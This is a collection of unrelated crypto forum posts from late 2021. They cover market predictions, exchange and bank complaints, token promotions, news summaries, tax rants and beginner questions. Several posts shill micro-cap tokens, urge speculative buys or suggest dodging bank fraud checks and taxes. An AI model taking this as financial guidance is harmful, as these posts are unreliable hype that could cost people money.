I have a lot invested in my Kucoin account and as soon as those coins are supported at another exchange I am absolutely getting the hell off this criminal exchange.

Trying to gather data and insight on previous market psychology and actions from previous bull runs. Maybe this information can be beneficial for traders and long term holders. Overall, the mission is to forecast the current and next Sequence.

Currently, I believe this to be the mini alt Szn. With Bitcoin, Ethereum, Cardano, Ripple moving just slightly compared to altcoins. I see Bitcoin gaining market dominance around Thanksgiving. Ethereum, Cardano, Ripple etc. projects then contend for market share. The following leading to a crazy alt Szn. Trillions of dollars leaving giants for small cap altcoins. Small cap altcoins profits are then fueled to growing stable projects. And then market overload. 

I recall 2017 was something like Alts, then Ethereum, then Bitcoin, then Ethereum/Ripple/Stellar, then Alts, then the January crash. I do remember that the year peaked with Bitcoin, then Stable Projects, then Alts went crazy. 

Things that could change this bull run is a possible extension into 2022. Possibly mid February depending on the market sentiment [news and partnerships etc]. Definitely not worth the risk considering the big dead cat bounce afterwards. But definitely great to consider for long term holders.

Any and all other insights to forecast are welcome!

Hello guys,

im a big fan of [crypto.com](https://crypto.com). I use Kraken as my main exchange because they are secure and i trust them. I like the way the app is designed and the support is amazing aswell.

However they lack the stacking opportunities CDC has. The main reason is im using it as a second exchange is the Debit Card. 

In germany gaining 2% cashback is actually quite a lot. For example AMEX offers 0,5%, Amazon aswell (more if you order on amazon). Those deals literally just suck.

With the ruby card (350 Euro Stake) i get 2% Cashback and Spotify cashback worth 10,63 every month.

That alone is like 36% Return a year (!).

With recent events (coinbase listing) [Crypto.com](https://Crypto.com) overpassed Tiktok in the play store. They really stepping up the marketing game with formula 1, UFC partnerships and a lot coming up. Q4 is about to be wild and they promised us.

I bought in at 9cents and was like, Damn im late. However i tripled my money within 8 months and the card works flawless. I just buy groceries and fuel with it. 

If you have any more questions im happy to answer them. My honest opinion is that this card is a no brainer for EU (cuz we somehow arent involved with great cashback deals like the US)

Cheers, David

That rant fails as it begins

Said rant opens with and asserts

"You make money ...". 

No, no you don't. In fiat land you never ever make money. Only a licenced bank or the gov can make money. You, on the other hand can only receive pre-existing money into your ledger (bank account wealth pile whatever). 

When you "trade" shares at a profit you do not make money. You receive money from a pre-existing ledger from the counter parties account. 

When you work for someone all the money you get has to come from their account 

Money in only made by the entities such as banks that can issues debt instruments.

You have never and will never make money. 

As to tax, expropriation without consent it is the same as anything else without consent. 

The issue with tax is it misallocates capital in the market with no means of market dicipline as taxes can just be increased.

The squid game coin issue has brought to light a fundamental problem in my opinion:  
**people are not able to DYOR and most of the time FOMO and buy then think**  
So I decided to give you a few tips to make it easier for you, these are the main things I look at when I have to decide what to invest in:

* **The coin's code is open source**  
this is really important, the code of the crypto must be saved somewhere (preferably github) and must be available to everyone.  
Even if you can't read the code, it doesn't mean you can't look it up.  
This doesn't mean that all reliable cryptos have open source code, however most scams have private code... do the developers want to hide something?  
however there are some cases where crypto scams have open source code (e.g. SquidGameCoin), there are still some things you can look at on their github profile to understand if they are reliable
* **The coin has a public whitepaper**  
Every coin has a whitepaper where all the information about it is stored, there should be written the how (the technologies) and the why (its purpose).  
If the whitepaper does not answer to these two questions the project very probably is one scam.
* **The developers behind the project are public**  
This point is self-explanatory, if a cryptocurrency has a public face most likely it is not a scam because the people who work there put their faces.

I would like to analyze now how I did the research before deciding  **to** **not** invest in SquidGameCoin:

* SquidGameCoin code is saved on github:  
[https://github.com/bscsquidgame/SquidGame](https://github.com/bscsquidgame/SquidGame)  
Really good thing! right?   
Not really, as a developer I had a good laugh seeing this github page, there is only one branch and the pr are non-existent, a symptom that the code has not been changed even once since it was first published 22 days ago (there are commits from 11 days ago but only readme files).  
Then i analyzed the profile that published the code, he has no contribution on github except in his project and he has only one repository  
BIG RED FLAG for me at this point, but I dig even deeper at this point because i was really curios.
* SquidGameCoin has a whitepaper, but if you managed to read it before they removed it you will have had a great laugh.  
I leave you the link to a whitepaper (done well) of a project in which I believe very much:  
[https://hedera.com/hh-hbar-coin-economics-paper-060320-v6.pdf](https://hedera.com/hh-hbar-coin-economics-paper-060320-v6.pdf) 
* SquidGameCoin developers are in hiding and have not revealed themselves to the public.

At this point my interest and FOMO for this coin had already dropped below my feet, a good way to keep FOMO under control is to research and know how to do it.

These are the things that I personally look at before investing, i hope this guide will be of help especially to inexperienced people who approach the world of crypto and fall prey to these scams and influencers.

TLDR: how to avoid ScamCoin? you have to look at this thing

* **The coin's code is open source**
* **The coin has a public whitepaper**
* **The developers behind the project are public**

 Kazakhstan has limited the amount of money local retail investors can put into crypto, domestic news website Kapital.kz [reported](https://kapital.kz/finance/99986/utverzhdeny-limity-na-pokupku-kriptovalyuty.html) on Wednesday.

* The AFSA confirmed the news to CoinDesk via email later on Thursday.
* Retail investors can invest 10% of their annual income or 5% of their total assets, excluding their main residence, up to $100,000 per year as long as they provide evidence of their finances to the regulator, the site reported.
* Should investors not provide any evidence of their finances, they can invest up to $1,000 per month, according to [Kapital.kz](http://kapital.kz/), which said it attained the information from the Astana Financial Services Agency (AFSA) directly.
* The limits have been introduced to protect retail investors from crypto-related high risks that can include the complete loss of capital, the AFSA told Kapital.kz.
* The AFSA has also created a roadmap to develop the crypto market in the country. Under the plan, crypto exchanges will operate as a pilot starting at the end of 2021 and for one year.
* The rules set by the AFSA took effect on Oct. 26, the report said.
* The agreed rules are harsher than those proposed by the Astana International Finance Center (AIFC) earlier, according to Kapital.kz. An AIFC committee had proposed a monthly limit of $2,000 for retail investors.
* Kazakhstan has seen a massive influx of crypto miners since China started a crackdown on the crypto mining industry in May. The country is facing severe electricity shortages, in part because of the influx of miners, and is planning to [limit](https://www.coindesk.com/policy/2021/10/22/kazakhstan-to-limit-power-for-crypto-mining-to-100-mw-nationwide/) the electricity consumption of new mines.

What is your opinion about Solana? It had a lot of criticism back when i did my research and suddenly it went up like crazy...

Solana now has a larger market cap than Cardano. Why the reasons are mainly to be found in the metaverse and NFTs.

You might think it was coming: as a result of a massive surge, Solana (SOL) is knocking rival Cardano out of 5th place among cryptocurrencies by market cap. Up 30.1 percent in the last 7 days and up 16,808.2 percent in the last year, the climb towards the top of the podium seems well deserved, especially considering how hard Cardano is currently struggling. It can be assumed that these price developments are driven by the announcements of Facebook, recently Meta, the developments in the (NFT) space and the concerns often expressed about Ethereum these days.

Solana now not only has over 400 projects on its own blockchain, but also over 1,100 validators in its network. Currently, no other platform can boast such a high staking share. This means that a high proportion of the tokens are held in the wallets for a certain time and the holders are rewarded for this with so-called rewards. 

However, the hype around digital collectibles did not just emerge yesterday, but has been growing strongly for several months now - and Solana is benefiting from this to a particular extent. According to [CryptoSlam.io](https://CryptoSlam.io), Solana is the fourth largest blockchain for NFTs after Ethereum, Ronin and Wax, and the trend is rising. 

Major investors also backed Solana Labs with $314 million in its token sale in June. Among them were venture capital-giving firms such as Andreessen Horowitz and Blockchange Ventures. According to a Bloomberg chart, Solana is currently the third most popular cryptocurrency for investors, behind Bitcoin and Ethereum. By comparison, while Cardano, which previously ranked fourth, saw inflows of five million U.S. dollars last week, Solana received 15 million U.S. dollars.

Want to clarify from the start that I personally have never had any issues depositing/withdrawing to exchanges at a fairly low level (about 1k / $1300) of each.   

There does however seem to be marked increase in reports of people encountering problems, triggering fraud algorithms or having accounts locked in the UK, sometimes with the banks involved the ones that we recommend as a community. 

Before getting involved in crypto I took a fair bit of time to examine the banking options available to me, as I'm sure you're all aware is one of the biggest hurdles crypto investors have worldwide.

I'm in the UK, and the responses I got in the sub and from other research was that the best three options were the so-called challenger banks: Starling, Revolut and Monzo.

I already had a Monzo account, but use that as my main account, so I attempted to open a separate account with Revolut. Hilariously, the growth of my lockdown beard made me look so unlike my driving licence I failed their facial recognition, so I ended up depositing through my regular account.

As I said earlier, the whole process has been remarkably smooth compared to some of the horror stories I've seen on here. I've never waited more than 10 minutes for a deposit or withdrawal to go through.

Fast forward to last week, where someone had hinted in a reply to a post that regulators in the UK were clamping down on crypto in general. Binance fell foul of UK regulators in June, and most banks won't touch them as a result. There's a few articles that hint that several banks have changed their position, including one I'll link below that lists several UK banks which are blocking cryptocurrency transactions entirely.

I tried to get some clarity on the situation, but it was real hard to come by. 

There were several posts on Twitter from people complaining of issues that depositing to exchanges that they hadn't had issues with before, with most UK banks including customers of the crypto-friendly ones.

On the Monzo community boards there's a reply from an employee in a post about crypto that reads as follows:

"We do block some crypto exchanges and/or more transfer services but I dont have a definitive list of which ones (&amp; Im not sure Id be able to share it if there was one anyway)."

To me, this position doesn't make sense. First off, there's clearly a list. Don't pretend there might not be one. Why not give people all the information they need to make a decision. Crypto adoption is clearly happening, and I'm sure customers want to operate within the law as much as the banks do. I'm also 100% sure that if offered the choice to not have their account frozen, they would take that choice.

On their sub someone posted a screenshot yesterday of a convo with Monzo, where they referenced 'an increase in fraudulent behaviour' relating to cryptocurrency.

Over at Revolut it seems that some people can't deposit to certain exchanges, possibly as a way of encouraging them to use Revolut's own crypto service.

Starling also changed their stance on cryptocurrencies briefly earlier in the year, banning them, then reversing that position shortly afterwards. Their CEO was quoted as describing cryptocurrency as 'quite dangerous' in an interview in July, where she also acknowledged that crypto integration with banks was only a few years away. Which is it, because it can't be both?

What seems to be clear is that banks don't want to give a solid position on crypto. There's always some confusion around what the actual position is, or there's a caveat attached like yes *but not all exchanges.

There are definitely more reports of people having accounts frozen, but without more information on why we can't really make a judgement. Were they holding $10 or $10,000,000? Context matters.

From the banks point of view if the account has been only used for buying and selling cryptocurrency, and has a regular flow of cash in and out then they're going to flag it, especially if you're moving large sums.

Therefore I think having a crypto only account might not be the best course of action. Use that account for regular purchases too, so you are less likely trigger money laundering algorithms.

If anyone can provide any more information about UK regulatory changes I'd be interested to read it. I can't see any official notice since the Binance one in June, but I fear that the tide is turning.

Fully expect this post to get labelled FUD; but Fear, Uncertainty and Doubt aren't good things where banking is concerned and the lack of a clear position from banks on this matter doesn't fill me with hope for the future.

TLDR: even crypto-friendly banks seem to be getting less friendly to crypto.

One day after winning the election as the next mayor of New York City, Eric Adams is already talking about plans for a city coin in an interview.

No sooner has the new mayor of New York City named Eric Adams been elected into office than he is holding out the prospect of a cryptocurrency of his own to the residents of the coastal metropolis. He was asked by Bloomberg Radio how he plans to make New York City a crypto-friendly city. To which he replied that he had already met with the mayor of Miami and that the two now wanted to hold a "friendly competition" with their respective cities.

The Miami Coin, to which Adams alludes here, is indeed extremely popular. Miami Mayor Francis Suarez wants to use it to help turn the city into a center for cryptocurrencies. He hopes to help fund the city's activities by mining the Miami Coin instead of relying solely on taxes.

New York is to remain the financial capital when it comes to crypto as well

So with Eric Adams, there is apparently now a similarly crypto-friendly incumbent sitting in New York City's City Hall as his Miami counterpart. The former police officer has already been serving as the so-called Borough President of the New York City borough of Brooklyn since 2013. Already in the first interviews after his election, he affirmed that as mayor he wanted to ensure enough tech jobs in the city.

Amazon had originally planned a new headquarters in the city, but abandoned this project in 2019. However, Eric Adams emphasized that they were not dependent on this. After all, he said, the number of startups in Brooklyn alone had increased by 350 percent in the last ten years. The city's reputation as the nucleus of the financial world is to be retained by New York even in the age of crypto stocks, according to Adams' idea.

I think taxing 1/4 of my gains is too much.
(In Germany) 

Also paying 200$ just for the tax report is bullshit.

If the government knows how much I owe them they should just tell me atleast or pay for the tax report. a

I also hate the fact that you earn money from work and pay taxes on it, then you use your taxed money to make money in crypto and get taxed again and then you wanna spend your money and buy something where u also pay taxes.

According to a report, the number of crypto jobs is on the rise. At the same time, more and more traditional banks are among the employers looking for crypto talent.

A new report from LinkedIn shows that the number of crypto-related job postings is on the rise. Unsurprisingly, it's mostly companies in the field that are pushing up the number of available jobs. However, more and more banks from the traditional financial sector are venturing into terrain that is still rather unknown to them and are looking for new employees for whom the crypto scene is not new territory.

The report published by the U.S. job board announces that financial firms are looking to hire more than three times the amount of crypto talent this year compared to 2015. In addition, LinkedIn announced that the number of job posts as of August with the keywords "crypto" and "blockchain" in the U.S. market saw an increase of about 615 percent year over year.

However, according to the U.S. job board, the different work culture in banks on the one hand, and the tech and startup scene on the other, is often a hurdle. Nevertheless, the trend is increasingly moving toward crypto, it added. LinkedIn stated in the report that even some of the oldest and most established figures in the industry were "reshaping their careers in response to the promise of financial technology."

**War of the crypto employers**

Data from Revelio Labs shows which banks filled how many crypto jobs. In doing so, Revelio Labs analyzed public LinkedIn profiles related to crypto, it said. The chart shows the top 10 companies surveyed by Bloomberg.

Here, traditional banks and companies in the blockchain space are in a real "war for talent." According to Bloomberg, potential employees with experience in the crypto or blockchain sector can look forward to hefty bonuses. This is because they go home with between 20 and 30 percent more in terms of salary. A separate study by Revelio Labs also shows that start-ups and smaller companies with a low number of employees would proportionally receive the most crypto talent. According to the study, the larger financial institutions will have to work hard to keep up with the competition.

It stands to reason that the financial industry is now looking for more crypto talent. However, other industries are also moving forward in the crypto space and are looking for employees to help companies in the field.

Cryptocurrency exchange KuCoin revealed its new product dubbed KuCoin S.

The main idea for the KuCoin team was a dedicated social platform for crypto that would offer a world of benefits that goes beyond just trading.

As the team claimed, within the global news industry, there is the issue of fake news being peddled all over and for the crypto industry allowing unverified news to cause severe consequences.

Currently, social trading features are only available to invited users, and KuCoin will gradually send out more invitation codes.

Invitation Codes to enter:

That's right, digital silver for the win.  For an easy view of bitpay stats, see this infographic from my profile: https://i.redd.it/3wbue49gbqx71.png  You can also visit bitpay.com/stats and mouse over the graph and circle chart to see the percentages in particular months.  

Litecoin was added to bitpay July 30th with Newegg supporting it first through bitpay.  It managed a fraction of a percent for July even with just a couple of days to work with.  In its first full month in August it rose to over 5.48%, coming in fifth behind BTC, ETH, BCH and DOGE.  In its second full month, Litecoin rose to 4th place with 8.6%.   Finally, in it's third full month it beat every altcoin on the platform with a 12.2% share, coming in behind only Bitcoin itself.    

All that while many even within crypto still don't know that Litecoin is even supported by bitpay, or paypal, venmo, verifone, newegg, amc, interactive brokers, that Grayscale wants to convert its popular LTCN trust into a spot etf as soon as the sec will allow or its many other recent infrastructure news items.  They don't know Litecoin recently added Omnilite, has had MWEB in development for a year with release just around the corner as taproot looms as well.  

Litecoin has thrived for 10 years with constant development while adding and supporting infrastructure growth with constant liquidity across nearly every exchange, payment processor through bull and bear markets, longer than any other altcoin.  DYORers may discover that Litecoin is the deepest value play in the entire space and get a head start on those who wait to investigate until after progress gets priced in.

So I think these are thoughts of capitan obvious and most of you here are already aware. 

We are manipulated, yeah I know it sounds like conspiracy theory but hear me out. I am using leverage trading on SAND and Ive noted some weird behavior. I am looking 1s chart, people say it doesn't matter but it shows some interesting things. 

&amp;#x200B;

My thesis is that the more you buy, more you dump a coin. When I look at the image and I see a price peak, there is instant action from some entity that sells immediately. I came to that conclusion, because I look at the chart constantly and nothing really happens when no one buys. Try to buy, and you will be dumped right away. I was thinking hey maybe its just order but why order wasn't triggered by peak?  


I thing we have several options here. 

1. There is bot, who helds longs made at the beggining and dumps little chunks of price based on order book
2. There is bot, who shorts each time there is a price peak
3. People are closing their possitions

I sound like silly doomer I know, but I am silly doomer. This would mean that whole market is artificially sustained and suppressed.

Good morning everybody, I would like to ask about long-term investments and the best place to find signals or advises for long-term investments. Is there a place that send signals for long-term investments along supporting it with reasons? If possible,  

&amp;#x200B;

I tried short-term investments but it is so stressful and makes you worried all time. That is why I want to look into long-term investments. And how much is the best amount of money to invest at to get reasonable profits?

&amp;#x200B;

Also I use Binance for trading, do you suggest any other websites rather than Binance, and if you suggest Binance, do you suggest Margin trading or Spot trading? and why?

&amp;#x200B;

I apologize if I asked any dumb questions, I am new here, and thank you for the help.

Hey all, new to the crypto space and would like to get a understanding on my logic here, and I apologize if this is the wrong space to post this.

Say i'm bullish on ETH, but it's at an ATH and i'm worried about the bear market where everything dips by 90%.

Could I then leverage impermanent loss instead to own more ETH on Uniswap by providing liquidity to the USDC-ETH pools? Since USDC is pegged to a dollar, based on my elementary understanding of impermanent loss i'd own more ETH when it dips.

Also, if you have any useful resources on cryptocurrencies (especially on how to actually understand whitepapers), please feel free to share them. I've been watching a ton of Coin Bureau videos, love the dude though i'm not a huge fan of technical analysis.

Hey guys, looking for a high staking coin I recently found DeFiChain. DFI is a well established young project that aims to bring decentralized finance to Bitcoin. It is based on the Bitcoin blockchain, but it is an independent blockchain. While a lot of DeFi happens in the Ethereum blockchain, DFI focuses on the BTC blockchain because they believe it to be as important as the ETH blockchain.

The fees are super super low and the rewards for staking are crazy high, at 56% APY as of now. The DEX is already working well and they recently released their mobile app. There's a HUGE update coming, called Fort Canning, that is going to be introducing native protocol supportfor decentralised loans. This is bringing auctions, bids and stock tokens based on real prices. Composite swap is also being added, enabling swapping across up to 3 pool pairs.

The devs are amazing and so is the community, they interact a lot with each other. This project feels like it comes out of pure passion, there wasn't any ICO, tokens were airdropped and the devs are constantly funding the community ideas to continue expanding DFI.

If you want to know more about it, you can check https://defichain.com/ or join the telegram channel (can't post the link, I can DM it) to ask around!

Just a contrary opinion to the top post right now. This seems to be a place for people to talk about cryptocurrencies. For some people that means asking questions because we were all noobs once. For other people, it is a place to shill their favourite meme/poopcoins (poopcoin, patent pending). We all have different ideas about what this sub is for.

What we all know and feel is that this isn't a sub to talk about politics and shit talking about high taxes after you sell your bag is not libertarian, is actually human nature, you got something that is country independent and your country wants to keep x of it.   
Complain away people, say loud and proud "Fuck Taxes", say everything you want and make this space what you goddamn feel it is for you! 

At the end of the year though, I do advise everyone that needs to pay taxes, to do it to the best of their abilities or to move to Portugal just before taking profits! 

&amp;#x200B;

Be good to each other!

Posting this "Beginner"-Question here because some btc subreddit deleted it due to mentioning alt coins.

&amp;#x200B;

A lot of alt coins reached their max supply so far so there should be some data.

Has somebody an idea/statistic what happened the most to them. Did they drop? Rocket? Lost trading volume?

Does it make a difference if max supply is reached. Should someone invest in a coin which has not reached max supply yet?

&amp;#x200B;

Here is a poem for minimum length:

My Bitcoin is Mine - from Rajdeep225

All comes roaring, when it goes to moon,  
Keep shouting $10k, $100k, $1000K is coming soon!  
Where were you when it was going down?  
Dumping it, supporting lies, or wearing your bearish clown!  
Some say love the tech, some say here for the ideology,  
But all of us are looking to fill our greedy spoons!  
Let the candles move, may the longs always shine,

Everyone, I think I found a way around the system! It's bullet proof! Hear me out:

so we all know coin price rises immediately when we make a sell. This is basically an undisputed law of the market. A fact. A Bogdanoff effect if you will.

What I did today was I sold the smallest part of the coin, that was previously not moving, and it did a 2% rise right after. Imagine what this would do if you keep doing it over and over!

Also to note, you can do the same in the other direction as well. So if you want to get a good entry on a coin you love, just buy a teeny-tiny amount and the price will fall, getting you to the area you actually want to buy!

I think this is a great way around the market to trick the whales so we ACTUALLY make gains!

 So I converted some of my ADA to Tether on Kraken so I could then transfer it to my Metamask Wallet. That all went fine. I did this so that I could then use the Polygon bridge app to transfer said Tether to the Polygon chain.

First I set the amount of Tether to the max amount. Then I clicked Transfer. The usual notice about what's supported and what isn't popped up and I clicked continue. The gas fee estimate was around 45$. I clicked continue again. and then again to take me to the Metamask confirmation window.

This is where the mistakes started happening. I went in to edit the priority of my transfer. I put in the lowest Gaslimit, The lowest Max priority fee, and the lowest fee possible. I clicked save and then confirmed. This didn't work at all. I got an instant error and nothing went through. I tried this a couple of times. The same thing happened. Then I tried raising the numbers slightly. Then things started happening. Polygon transfer was processing. However, The transaction failed again. I thought ok well my transaction just wasn't accepted because my fee wasn't high enough to be accepted for the next block, I'll just try again with the same figures until I get accepted.

After five fails I googled to find out what I was doing wrong and I figured out it was my Gaslimit. OK, so I'll try again and won't change the Gaslimit, just the lowest Max priority fee, and the lowest fee possible. It worked! But where is my Tether? Why is it not on my Polygon Wallet? Oh ok, it can take up to 8 minutes. Nope still not there. It's still sitting on the Ethereum chain. No Idea why but it is.

While I was trying to find out what wasn't working I had noticed that my ether balance dropped. What I didn't realise is that every time my transactions failed due to the "out of Gas" error I was actually paying the Gas fee without my transaction going through. For some reason, my brain had the information that I would be reimbursed for the failed transactions. Nope!

Luckily it wasn't a huge amount but enough to turn a good day into a bad one. Plus I feel a very dumb.

Anyhow have a nice morning, evening, night or day for you folks on the other side of the world. Cheers!

Im starting to believe that the money that was in Shib is starting to flow into small market cap cryptos on Coinbase. For example Jasmy went from 10 last week to 23 cents. XYO went from being 2 cents to 7.5 cents. Amp also went from 4 cents  to 8 cents for a bit of time. Iotx went from 6 cents to 50 cents. Alchemy also had a slight pump of 5 to 12 cents. It seems like theyre just pumping and dumping these cryptos. Is this what happens after Bitcoin pumping or what do you guys things? This kind of reminds me how they had pumped file coin earlier this year as well. Are they just going for low market cap cryptos or will everything start to pump?

Government spending is out of control in the USA. Trillions on wars no one wants. Trillions in debt from wars no one wants. Congress always gets raises. Minimum wage hasnt changed in forty years.

We are run by a club of individuals who spend endless money and do not care about what is actually good for their constituents.

The USA needs to face the facts: Americans, you are not being governedyoure being ruled over.

Being able to selectively pay taxes is a way to sit Uncle Sam in the corner for being a naughty boy and tell him he wont get dessert until he starts behaving properly.

Crypto brings financial power back to the people. If you dont see that then go take your fiat and leave.

The polkadot parachain auctions are almost here and binance launched something like a warmup.

How many of yall hold DOT and how many of yall are participating in the polkadot parachain auctions crowdloans? 

I wanted to ask which project are yall looking to vote for and a short why? Im a bit confused to choose the best one. 

And people who arent participating, is it because of the 2 year lock up period? Dont yall think itll be worth a lot more after two years and as a bonus we also get the project tokens which might blow up and actually make us rich? 

Thanks, pls lemme know if Im missing something because it just seems too good leaving the fact that 2 years lock up isnt a problem for me

Ive been following IOTX closely after unexpected increase in price. Now it has reached the $1B club but why?

Couple reasons:

IOTX supply release has reached 100% circulation in Nov 2021. All the selling pressure from early contributors is easing up. 

IOTX positions itself as part of the Metaverse by speeding up ETH dApps

IOTX dApps saw massive increase in users. Notably Quickswap

IOTX saw a 26 fold increase in new wallets

IOTX community growth grew massively in the past few months

Huge buying pressure from Coinbase whales forcing price up from all platforms

Deflation is already happening with more coins being burnt as they scale

The other day, I heard an ad about this token called Anatha, i yolod $50 bucks into it at a price of 35 cents per token. 

Today, im cruising the charts on [nomics.com](https://nomics.com) and I see  wANATHA priced at 16 cents per token...

Did I just get ripped off? The original anatha token is still in token sale stage and the price is locked at 0.32 cents. 

I brought it up in their telegram group and they brushed it off as a "convenience fee"

I am confused on so many levels, how can there be a wANATHA if the original ANATHA is still in token sale page. 

How much of a dummy am I? I always thought 1 wrapped token is always = 1 token. Is it even possible to be priced so differently??

Just to clarify, wANATHA is a wrapped of the ANATHA. I am not confusing 2 different cryptos.

Recently I wanted to lend my Bitcoin to borrow USDC and trade with that USDC.
But I cannot afford to lose my Bitcoin.
We have AAVE protocol on Ethereum which already has $23B in TVL and Venus protocol on Binance Smart Chain.
The fee on Ethereum is too high that I doubt if I could make it with the lent USDC. 
Meanwhile Venus protocol is on BSC, which is not so decentralised but still it works fine.
There aren't any great platforms on Solana yet. 
Which network do you prefer to make such transactions?

Hello,

Just wanted to warn / advise everyone here to avoid using crypto.com app Here is why.

1). You can not sell Shiba Inu OR Doge Coin
2). They have literally zero app / customer support I have requested 4 times now help with not being able to trade or sell my currency over a 6 month period and have never received a message back.
3.) Their app takes requires you to download a new version almost every time you open it, however, it  still crashes even with the new versions.

Would love to hear others experiences

Hi, Im a Canadian with a Canadian debit card and it seems to be causing me trouble when Im trying to buy crypto. Ive done a bunch of research and now Im feeling ready to start investing, yet when I go to buy crypto on binance  the transaction keeps failing. I went to my bank to see if it was an issue on their end, but they told me that theres no restrictions on my account or anything like that. Ive read that you cant buy or withdraw with debits in Canada but I dont know how people use binance then. Anyone have any suggestions on what u should do?

Viking Swap (VIKING) currently has a very low market cap (approximately $339K) and only 8M coins in circulation. The price is only at $0.04/coin right now. Because of the low mcap, the price is very sensitive to even modest investments and easily go up &gt;10,000% with even the slightest push. Why not throw down $100-$200 and see what happens? Thats what I did . Obviously Im pushing for this because I invested in it. Right now, it seems pretty low risk as all you rly need to put down to potentially make a decent return is, like I said, $100 or more. 

Fuck it, lets see what happens.

Still new to the community here but had a question and with over 3 million people in here hoping to here some different perspectives. 


Do any of use staking your crypto as an alternative to basic savings accounts and even high yield savings accounts ?

Currently I use crypto.com and I also have their DeFi wallet, Im considering using the DeFi wallet to stake ( sUSD 15.13% - tether 8.49% - cro 12.48%) 

All of these % are pretty good when comparing to ally or betterment high yield savings which I currently use.  I am still going to keep my emergency fund in a normal savings account for liquidity. However would it be beneficial to stake one of the above named options on the cdc defi wallet? Has anyone in here done so and had success? 
Or are the fees too high and defeat the purpose all together?

Dude

Not long ago Ergo was one of the most shilled coin here and I gave in and got a bag. Everything else is pumping. But not ergo. 

No one here talks about Kadena. I bought a bag around the same time after doing some research. And it has 4
6x in a matter of weeks. 

This has happened more than few times. 
Keep was another example. 

USDT has more volatility than your cardano and algo. 

Im done taking suggestions from this sub. 

I have come to the conclusion whenever a coin is shilled here, it is too late. 

Rant over.

So for the most part, my experience moving crypto has consisted of 1. Buying BTC and moving it to Kucoin
2. Doing my trade thang 3. When it's time to withdraw or cash out (which is very little, I am mostly hodling but occasionally have taken a bit of profit for something special) I will transfer to my crypto com account and fill my card to do whatever I want.

However I'm trying to expand at a reasonable pace my excursions, safely. I don't know if I understand using an external wallet properly though with regards to transactions. I purchased some eth from Kucoin, basically the bare minimum I could withdraw, and set up a trust wallet, so I could exchange for some more obscure stuff I haven't been getting into that isn't on exchanges. I noted the amount of ether, saw kucoins fee, and sent. Upon arrival, the eth was less than half what I sent. I'm aware there is gas, but the amount of gas it's showing, is not nearly what showed up. Also, it shows transaction fee, which I thought was the same thing . And neither of these numbers are what Kucoin had labelled as a "fee"

Some help understanding would be great, I was cautious and did this small amount as a test, and I'm glad, but it makes no sense to me right now how this much was gone; I was under the impression gas was it for charges

**What is United Doge Finance (UDOG)?**

United Doge Finance is a community-driven token and platform that says its goal is to allow users to be able to build credit with the use of a crypto powered credit card, along with several other credit driven financial offerings.

The project aims to "redistribute power from credit agencies to individuals" - helping to create a more transparent, balanced and fair credit system.

[United Doge Finance](https://uniteddogefinance.com/) was founded in August 2021 and created with the investor and community in mind. The goal is to provide generational wealth to all loyal holders with a hyper-deflationary functionality and automatic staking to reward UDOG holders.

The team behind the platform plans to develop its own ecosystem, including a crypto powered credit card, portfolio smart wallet, exchange/swap engine, cross-chain bridge, NFT marketplace and other financial offerings.

**Who are the Founders of United Doge Finance?**

United Doge Finance was founded by Brandon Collins, Samuel Moya and Keith Biggar Jr. All three co-founders have a background in business, leadership and entrepreneurship. They came together with a vision to simplify the credit process but also make it more transparent, balanced and fair for all.

The project is now headed by the co-founders and ten other individuals, all of whom are transparently provided on the projects website.

**What Makes United Doge Finance Unique?**

In contrast to many other crypto projects, United Doge Finance promises to provide a complete ecosystem that will provide its token actual value and real-world use cases. Its portfolio smart wallet, which is scheduled to launch in March of 2022, is a smart wallet that will allow users to keep track of their investments, host credit accounts and stake their crypto holdings for a return. The portfolio smart wallet will also allow the users to store their NFTs and link to the exchange/swap engine, cross-chain bridge and NFT marketplace.

The UDOG token automatically distributes 3% of every buy and sell to its holders and automatically auto burns 2% of every buy and sell from its total supply, making the value of holdings increase with every transaction.

**How Many United Doge Finance (UDOG) Tokens are there in Circulation?**

United Doge Finance had a total supply of 100 quadrillion tokens at launch. 50% of that was burned at launch, allowing 50% to be available for circulation. In addition, United Doge Finance, being a deflationary token, auto burns 2% of every buy and sell. At the time of writing, there was a circulating supply of 98,819,674,411,864,700\*\*.\*\*

United Doge Finance has an anti-whale feature that disallows a large token holder from trying to manipulate the price or dump the token, although it goes unclear whether this goes beyond mere price slippage when selling.

**How is United Doge Finance Network Secured?**

United Doge Finance is an ERC-20 token on Ethereum.

ERC-20 is a token standard most new tokens follow when publishing on the Ethereum blockchain. [Ethereum](https://coinmarketcap.com/currencies/ethereum/) is one of the most popular blockchains and the go-to solution for many decentralized applications. Its [proof-of-work](https://coinmarketcap.com/alexandria/glossary/proof-of-work-pow) consensus mechanism requires miners to mine new Ether and ensures that Ethereum is one of the safest blockchains in the crypto industry. A set of decentralized [nodes](https://coinmarketcap.com/alexandria/glossary/node) validates transactions and secures the Ethereum blockchain.

**When Will United Doge Finance Trading Begin?**

United Doge Finance trading began on August 10th, 2021, on the Ethereum network.

**Can United Doge Finance Hit $0.01?**

Realistically speaking, given the 100 quadrillion initial supply, it is highly improbable United Doge Finance will ever reach $0.01, even accounting for the already burned supply. Ultimately, the likeliness of the token to hit its highest potential price, will be determined by how well the team can deliver on the projects vision and ecosystem.

**Where Can You Buy United Doge Finance (UDOG)?**

United Doge Finance is available on [Uniswap](https://app.uniswap.org/#/swap?outputCurrency=0x4a9d8b8fce0b6ec033932b13c4e24d24dc4113cd&amp;use=V2) (V2) and [SushiSwap](https://app.sushi.com/swap?inputCurrency=ETH&amp;outputCurrency=0x4a9d8b8fce0b6ec033932b13c4e24d24dc4113cd).

Avalanche has an incentive program where you get high yields on lending and even borrowing. Ive heard MATIC did the same. Does this harm the overall tokenomics of the coin because coins are being given away for free? Are the coins given by incentives freshly minted or were they already factored into the price? 

How long do developers give such incentives usually? I hope this Avalanche gravy train continues as long as possible! Im curious about any insights you all might have about how these defi incentives effect the price and tokenomics of a coin. Thanks in advance!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

It looks like Babycare was a bust and many people are asking how to sell out of it, but failing. I can only tell you what just worked minutes ago for me, Friday, Nov. 5th about 1:35 ish. Keep in mind, I only invested approximately 100 bucks and I only got back a little over 9 bucks, but that is better than nothing on a rug pull. I hope this works for anyone else trying to sell out of it and maybe you can choose a different slippage to get back more, I was just happy what I did worked.

In TrustWallet, pressed dapps, opened Pancake swap. In from field, chose Babrcare token and in to Field, chose Cake (Pancakeswap token). Clicked the cog wheel and set slippage to 20, turned on expert mode and disables multihops. Pressed swap and got message where I had to type confirm because expert model I think allows for higher slippage or something. I did not have to enter any address in the recipient field or anything like that.

